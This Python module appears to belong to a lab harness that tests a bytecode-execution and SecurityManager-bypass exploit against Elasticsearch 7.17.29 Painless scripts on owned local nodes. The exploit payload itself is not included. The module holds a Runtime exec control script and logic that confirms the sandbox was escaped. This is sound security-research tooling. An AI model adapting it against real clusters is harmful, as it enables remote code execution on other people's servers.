"""Elasticsearch 7 protocol checks and owned-node prerequisites.

SMALL/WARMUP/DENIED and the result parser are shared with the public client.
OwnedEndpoint is for lab nodes only: it verifies the server process and the
accepted TCP connection before sending a request. Runtime and distribution
checks below authenticate local lab files; API profile checks live in exploit.py.
"""
import hashlib
import http.client
import json
import os
from pathlib import Path
import re
import socket
import time

from . import common, processes


VERSION = "7.17.29"
REVISION = "580aff1a0064ce4c93293aaab6fcc55e22c10d1c"
CPU_FLAGS = {"avx512f", "avx512bw", "avx512vbmi", "bmi2"}
SMALL = "byte[] dst = new byte[3]; return Base64.getDecoder().decode(new byte[]{81,85,74,68}, dst);"
WARMUP = """byte[] whole = new byte[256]; byte[] padded = new byte[260]; byte[] dst = new byte[512];
for (int i = 0; i < 256; ++i) { whole[i] = (byte)65; }
for (int i = 0; i < 258; ++i) { padded[i] = (byte)65; }
padded[258] = (byte)61; padded[259] = (byte)61;
def dec = Base64.getDecoder(); int count = 0;
for (int i = 0; i < 1500; ++i) { count += dec.decode((i & 1) == 0 ? whole : padded, dst); }
return count;"""
DENIED = "return Runtime.getRuntime().exec('true');"
MARKER_TEXT = b"genuine-base64-es7-decoder-bytecode\n"
MARKER_RETURN = "owned-bytecode-executed"
MARKER_CLASS_NAME = "org.elasticsearch.painless.OwnedBase64Marker"


class NotReady(RuntimeError):
    pass


def release_values(home):
    values = {}
    for line in (home / "release").read_text().splitlines():
        if "=" in line:
            key, value = line.split("=", 1)
            values[key] = value.strip('"')
    return values


def runtime_identity(home, expected):
    """Verify the selected local JDK images against publisher-release pins."""
    # A matching version string is insufficient for layout-dependent memory
    # operations. Bind this run to the exact executable and runtime image.
    if not home.is_dir():
        raise common.Unavailable("JDK directory does not exist: " + str(home))
    values = release_values(home)
    if values.get("OS_ARCH") not in ("x86_64", "amd64") or values.get("OS_NAME") != "Linux":
        raise common.Unavailable("The ES7 payload supports the pinned Linux x86-64 runtimes")
    actual = {"name": expected["name"], "release": values}
    for field, relative in (("java_sha256", "bin/java"),
                            ("libjvm_sha256", "lib/server/libjvm.so"),
                            ("javac_sha256", "bin/javac"),
                            ("jcmd_sha256", "bin/jcmd"),
                            ("modules_sha256", "lib/modules"),
                            ("release_sha256", "release")):
        actual[field] = common.digest(home / relative)
        if actual[field] != expected[field]:
            raise common.Unavailable("Unsupported runtime binary: " + str(home / relative))
    return actual


def verify_server(server, expected):
    """Require the pinned ES 7.17.29 JAR inventory, launchers and stock configuration."""
    inventory_path = common.ASSETS / "jars-7.17.29.json"
    common.require(common.digest(inventory_path) == expected["jar_inventory_sha256"],
            "Elasticsearch inventory pin changed")
    wanted = json.loads(inventory_path.read_text())
    actual = {p.relative_to(server).as_posix(): common.digest(p)
              for p in sorted(server.rglob("*.jar"))}
    if actual != wanted:
        raise common.Unavailable("Elasticsearch JARs differ from the pinned publisher release")
    for relative, sha in expected["files"].items():
        if common.digest(server / relative) != sha:
            raise common.Unavailable("Elasticsearch publisher file differs: " + relative)
    if any(p.is_file() for p in (server / "config/jvm.options.d").glob("*")):
        raise common.Unavailable("Elasticsearch contains additional JVM configuration")
    return {"version": VERSION, "revision": REVISION, "verified_jars": len(actual),
            "jar_inventory_sha256": expected["jar_inventory_sha256"]}


def cpu_flags():
    groups = []
    for line in Path("/proc/cpuinfo").read_text().splitlines():
        if line.startswith("flags") and ":" in line:
            groups.append(set(line.split(":", 1)[1].split()))
    return set.intersection(*groups) if groups else set()


def java_prefix(sde):
    return [str(sde), "-icx", "--"] if sde else []


def common_jvm_options(out, gc_stress=False):
    options = ["-Xms512m", "-Xmx512m", "-XX:+UnlockDiagnosticVMOptions",
            "-XX:-CreateCoredumpOnCrash", "-XX:-HeapDumpOnOutOfMemoryError",
            "-XX:ErrorFile=" + str(out / "hs_err_pid%p.log"),
            "-Xlog:disable", "-Xlog:gc=info,gc+marking=info,safepoint=warning:file=" +
            str(out / "gc.log") + ":utctime,level,pid,tags:filecount=0"]
    if gc_stress:
        options.extend(("-XX:-DisableExplicitGC", "-XX:+ExplicitGCInvokesConcurrent"))
    return options


def flag_values(text):
    return dict(re.findall(r"^\s*\S+\s+(\w+)\s+(?::=|=)\s+(\S+)", text, re.M))


def preflight_flags(home, sde, out, timeout, gc_stress=False):
    """Check layout/intrinsic flags in a separate genuine JVM before starting a node."""
    # These settings are assumptions made by the pinned Painless layouts.
    # This is a separate JVM preflight; the server's actual argv is also saved.
    out.mkdir()
    command = java_prefix(sde) + [str(home / "bin/java"), *common_jvm_options(out, gc_stress),
                                  "-XX:+PrintFlagsFinal", "-version"]
    completed = processes.run_bounded_command(command, out, timeout, out / "process.json")
    (out / "stdout.log").write_text(completed.stdout)
    (out / "stderr.log").write_text(completed.stderr)
    common.write_json(out / "command.json", command)
    if completed.returncode:
        raise common.Unavailable("The selected JVM failed its flags preflight")
    flags = flag_values(completed.stdout)
    required = {"UseAVX": "3", "UseBASE64Intrinsics": "true", "UseCompiler": "true",
                "InlineNatives": "true", "UseG1GC": "true", "UseTLAB": "true",
                "TieredCompilation": "true", "TieredStopAtLevel": "4",
                "UseCompressedOops": "true", "UseCompressedClassPointers": "true",
                "ObjectAlignmentInBytes": "8"}
    if gc_stress:
        required.update(ExplicitGCInvokesConcurrent="true", DisableExplicitGC="false")
    mismatches = {key: flags.get(key) for key, value in required.items()
                  if flags.get(key) != value}
    if flags.get("UseCompactObjectHeaders", "false") != "false":
        mismatches["UseCompactObjectHeaders"] = flags["UseCompactObjectHeaders"]
    if mismatches:
        raise common.Unavailable("Required JVM settings are unavailable: " + json.dumps(mismatches))
    return {"required_flags": {key: flags[key] for key in required},
            "stdout_sha256": common.digest(out / "stdout.log"),
            "stderr_sha256": common.digest(out / "stderr.log")}


def parse_java_map(text):
    """Parse the maps returned as strings by the ES7 Painless execute endpoint."""
    common.require(text.startswith("{") and text.endswith("}"), "Painless result is not a map")
    parts, depth, start = [], 0, 1
    for index, character in enumerate(text[1:-1], 1):
        if character == "{":
            depth += 1
        elif character == "}":
            depth -= 1
            common.require(depth >= 0, "Unbalanced Painless result")
        elif character == "," and depth == 0:
            parts.append(text[start:index].strip())
            start = index + 1
    common.require(depth == 0, "Unbalanced Painless result")
    parts.append(text[start:-1].strip())
    values = {}
    for part in parts:
        if not part:
            continue
        key, separator, value = part.partition("=")
        common.require(bool(separator) and key not in values, "Malformed or duplicate result field")
        values[key] = parse_java_map(value) if value.startswith("{") and value.endswith("}") else value
    return values


def validate_result(text, role, marker_data, denied_marker_present,
                    marker_return=MARKER_RETURN, marker_class_name=None):
    """Check the file-marker comparison, including class identity and both controls.

    The command client checks its extended result in exploit.remote_proof().
    No marker or exception by itself establishes bytecode execution."""
    # A file alone is insufficient proof: require the request-specific class
    # result and the payload's repair/permission checks as well. Controls must
    # stop at the first unchanged decoder witness without producing the file.
    values = parse_java_map(text)
    if role == "affected":
        expected = {"stage": "bytecode-marker", "success": "true",
                    "bytecode_result": marker_return, "file_denied": "true",
                    "manager_present_before": "true", "security_restored": "true",
                    "security_readback": "true", "post_restore_denied": "true",
                    "restored_lookup": "true", "restored_heap": "true"}
        diagnostic = values.get("last_transaction", {})
        common.require(diagnostic.get("transaction") == "24" and
                diagnostic.get("last_success_transaction") == "24" and
                diagnostic.get("prior_unchanged_count") == "0",
                "The complete 24-transaction repair sequence was not demonstrated")
        common.require(marker_data == MARKER_TEXT, "The exact execution marker is absent")
        if marker_class_name is not None:
            expected["marker_class"] = "class " + marker_class_name
    else:
        expected = {"stage": "unchanged", "restored": "false", "no_write_proven": "false"}
        diagnostic = values.get("diagnostic", {})
        common.require(diagnostic.get("transaction") == "1" and
                diagnostic.get("last_success_transaction") == "0" and
                diagnostic.get("witness_length") == "20",
                "The control did not stop at its unchanged first witness")
        common.require(marker_data is None, "A control unexpectedly created the execution marker")
    common.require(all(values.get(key) == value for key, value in expected.items()),
            "Painless result did not satisfy " + role + " requirements")
    common.require(diagnostic.get("decoder_exception_kind") == "1",
            "The expected malformed-tail exception was not observed")
    common.require(not denied_marker_present, "The SecurityManager file-denial control failed")
    return {"fields": {key: values[key] for key in expected}, "diagnostic": diagnostic,
            "marker_present": marker_data is not None,
            "marker_sha256": hashlib.sha256(marker_data).hexdigest() if marker_data is not None else None}


def owned_java(launcher_pid, conf, identity=None):
    """Find the one JVM in the owned process group using its private config identity.

    Discovery may raise NotReady while the launcher forks. If identity is
    supplied, require the same PID, start time and executable digest."""
    found = []
    for pid in processes.descendant_pids(launcher_pid):
        if identity is not None and pid != identity["pid"]:
            continue
        proc = Path("/proc") / str(pid)
        try:
            if os.getpgid(pid) != launcher_pid:
                continue
            argv = [part.decode("utf-8", "replace")
                    for part in (proc / "cmdline").read_bytes().split(b"\0") if part]
            if "org.elasticsearch.bootstrap.Elasticsearch" not in argv:
                continue
            if ("ES_PATH_CONF=" + str(conf)).encode() not in (proc / "environ").read_bytes().split(b"\0"):
                continue
            executable = (proc / "exe").resolve(strict=True)
            found.append({"pid": pid, "start_ticks": processes.process_start_ticks(pid),
                          "argv": argv, "executable_sha256": common.digest(executable),
                          "linux_sandbox": processes.sandbox_status(proc)})
        except (OSError, ValueError):
            continue
    if not found:
        raise NotReady("Owned Elasticsearch JVM is not ready")
    if len(found) != 1:
        # A forked child can briefly retain its parent's Java argv and
        # executable before exec. Discovery retries instead of choosing one.
        raise NotReady("Owned Elasticsearch JVM identity is temporarily ambiguous")
    if identity is not None:
        for key in ("pid", "start_ticks", "executable_sha256"):
            common.require(found[0][key] == identity[key], "The owned server identity changed")
    return found[0]


def owns_tcp_socket(pid, port, client_port=None):
    proc = Path("/proc") / str(pid)
    inodes = set()
    for fd in (proc / "fd").iterdir():
        try:
            link = os.readlink(fd)
            if link.startswith("socket:["):
                inodes.add(link[8:-1])
        except OSError:
            pass
    state = "0A" if client_port is None else "01"
    for table, address in (("tcp", "0100007F"),
                           ("tcp6", "0000000000000000FFFF00000100007F")):
        local = address + ":" + format(port, "04X")
        remote = address + ":" + format(client_port, "04X") if client_port is not None else None
        try:
            lines = (proc / "net" / table).read_text().splitlines()[1:]
        except FileNotFoundError:
            continue
        for line in lines:
            columns = line.split()
            if (len(columns) > 9 and columns[1] == local and columns[3] == state
                    and columns[9] in inodes and (remote is None or columns[2] == remote)):
                return True
    return False


def owns_listener(pid, port):
    return owns_tcp_socket(pid, port)


def request(port, method, target, value=None, timeout=600, *, guard, on_sent=None):
    """Verify the accepted connection through guard before sending any HTTP body."""
    processes.cancellation_checkpoint()
    connection = http.client.HTTPConnection("127.0.0.1", port, timeout=timeout)
    try:
        body = None if value is None else json.dumps(value).encode()
        connection.connect()
        # Check the accepted socket, not merely the earlier listening port:
        # another local process could have acquired that port in the meantime.
        guard(connection.sock)
        connection.request(method, target, body, {"Content-Type": "application/json"})
        if on_sent is not None:
            on_sent()
        response = connection.getresponse()
        raw = response.read()
        try:
            value = json.loads(raw)
        except (ValueError, UnicodeDecodeError):
            value = raw.decode("utf-8", "replace")
        processes.cancellation_checkpoint()
        return {"status": response.status, "body": value}
    finally:
        connection.close()


class OwnedEndpoint:
    """HTTP endpoint for a node this runner owns, checked again on every connection."""
    def __init__(self, process, conf, identity, port):
        self.process, self.conf, self.identity, self.port = process, conf, identity, port

    def verify_socket(self, sock):
        common.require(self.process.poll() is None, "The owned launcher exited before the request")
        current = owned_java(self.process.pid, self.conf, self.identity)
        for key in ("pid", "start_ticks", "executable_sha256"):
            common.require(current[key] == self.identity[key], "The owned server identity changed")
        common.require(owns_listener(current["pid"], self.port), "The owned HTTP listener disappeared")
        common.require(sock.getpeername()[:2] == ("127.0.0.1", self.port), "Unexpected HTTP peer")
        client_port = sock.getsockname()[1]
        deadline = time.monotonic() + 10
        while not owns_tcp_socket(current["pid"], self.port, client_port):
            processes.cancellation_checkpoint()
            common.require(self.process.poll() is None and
                    processes.process_start_ticks(current["pid"]) == current["start_ticks"],
                    "The owned server exited before accepting the connection")
            common.require(time.monotonic() < deadline, "The connected socket is not owned by Elasticsearch")
            time.sleep(0.01)

    def request(self, method, target, value=None, timeout=600, *, on_sent=None):
        return request(self.port, method, target, value, timeout,
                       guard=self.verify_socket, on_sent=on_sent)

    def execute(self, source, params=None, timeout=600, *, on_sent=None):
        script = {"lang": "painless", "source": source}
        if params is not None:
            script["params"] = params
        return self.request("POST", "/_scripts/painless/_execute", {"script": script},
                            timeout, on_sent=on_sent)


def result(response):
    common.require(response["status"] == 200 and isinstance(response["body"], dict),
            "Painless request failed: " + json.dumps(response))
    return str(response["body"].get("result"))


def unused_port():
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


def wait_for_cluster(endpoint, out, timeout):
    """Wait for a settled owned node without treating a slow start as ready."""
    deadline = time.monotonic() + timeout
    evidence = {"status": "running", "timeout_seconds": timeout, "attempts": []}
    path = out / "cluster-settle.json"
    common.write_json(path, evidence)
    try:
        while True:
            remaining = deadline - time.monotonic()
            common.require(remaining > 0, "Fresh cluster did not settle within the startup timeout")
            window = min(120, max(1, int(remaining)))
            target = ("/_cluster/health?wait_for_status=yellow&wait_for_events=languid"
                      f"&timeout={window}s&master_timeout={window}s")
            attempt = {"started": common.utc_now()}
            try:
                reply = endpoint.request("GET", target, timeout=min(remaining, window + 5))
                attempt["response"] = reply
                common.require(time.monotonic() <= deadline,
                        "Fresh cluster did not settle within the startup timeout")
                common.require(reply["status"] in (200, 408, 503),
                        "Unexpected cluster-health response: " + str(reply["status"]))
                if reply["status"] == 200:
                    body = reply["body"]
                    common.require(isinstance(body, dict) and type(body.get("timed_out")) is bool,
                            "Malformed cluster-health response")
                    if not body["timed_out"]:
                        common.require(body.get("status") in ("yellow", "green"),
                                "The owned cluster has not reached yellow health")
                        evidence["status"] = "passed"
            except (OSError, http.client.HTTPException) as error:
                attempt["error"] = type(error).__name__ + ": " + str(error)
            finally:
                attempt["finished"] = common.utc_now()
                evidence["attempts"].append(attempt)
                common.write_json(path, evidence)
            if evidence["status"] == "passed":
                return evidence
            remaining = deadline - time.monotonic()
            if remaining > 0:
                time.sleep(min(0.25, remaining))
    except BaseException as error:
        evidence.update(status="interrupted" if isinstance(error, KeyboardInterrupt) else "failed",
                        error=type(error).__name__ + ": " + str(error))
        common.write_json(path, evidence)
        raise
